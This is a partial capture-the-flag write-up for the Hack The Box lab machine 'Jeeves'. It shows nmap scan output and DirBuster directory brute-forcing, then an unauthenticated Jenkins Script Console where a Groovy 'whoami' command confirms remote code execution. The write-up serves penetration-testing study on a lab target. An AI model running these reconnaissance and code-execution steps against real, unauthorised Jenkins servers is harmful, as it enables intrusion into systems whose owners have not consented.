Jeeves

https://www.hackthebox.eu/home/machines/profile/114

* Author: mrb3n
* Series: HTB

## Scan target using nmap

### Service Scan
```
nmap -sV 10.10.10.63
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-24 15:53 MDT
Nmap scan report for 10.10.10.63
Host is up (0.18s latency).
Not shown: 995 filtered ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 10.0
135/tcp   open  msrpc              Microsoft Windows RPC
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
50000/tcp open  http               Jetty 9.4.z-SNAPSHOT
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.93 seconds
```

two http ports stand out
Going to run dirbuster on them
80, 50000

### Running Dirbuster on IIS 10.0
```
dirbuster -u http://10.10.10.63 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
```

### Running Dirbuster on JETTY 9.4
```
dirbuster -u http://10.10.10.63:50000 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: /askjeeves/ - 200
Dir found: /askjeeves/about/ - 200
Dir found: / - 200
File found: /error.html - 200
File found: /jeeves.PNG - 200
Dir found: /askjeeves/people/ - 200

```

Testing out 10.10.10.63:50000/askjeeves
Discovered, anonymous access, navigated to Manage Jenkins
Clicked Script Console -

Type in an arbitrary Groovy script and execute it on the server. 
Useful for trouble-shooting and diagnostics. 
Use the ‘println’ command to see the output (if you use System.out, it will go to the server’s stdout, which is harder to see.) Example:

println(Jenkins.instance.pluginManager.plugins)

All the classes from all the plugins are visible. jenkins.*, jenkins.model.*, hudson.*, and hudson.model.* are pre-imported.

### Groovy Script Test
```
cmd = "whoami"
println cmd.execute().text

Result

jeeves\kohsuke

```	



